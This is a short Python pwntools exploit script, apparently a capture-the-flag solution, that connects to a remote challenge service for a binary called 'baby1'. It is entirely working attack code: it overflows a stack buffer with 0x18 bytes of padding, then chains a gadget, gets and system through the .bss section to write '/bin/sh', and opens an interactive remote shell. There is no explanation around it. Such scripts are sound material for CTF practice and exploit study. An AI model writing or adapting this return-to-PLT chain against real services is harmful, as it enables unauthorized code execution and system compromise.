from pwn import *
from time import sleep

context.arch = 'amd64'
#r = process('./baby1')
r = remote('baby-01.pwn.beer', 10001)

elf = ELF('./baby1')
system_plt = elf.symbols['system']
gets_plt = elf.symbols['gets']
bss = elf.bss()
gg1 = 0x400793

p = 'a' * 0x18
p += flat(
	gg1,
	bss,
	gets_plt,
	gg1,
	bss,
	system_plt
)

r.sendlineafter(': ', p)
sleep(0.3)
r.sendline('/bin/sh\x00')
r.interactive()
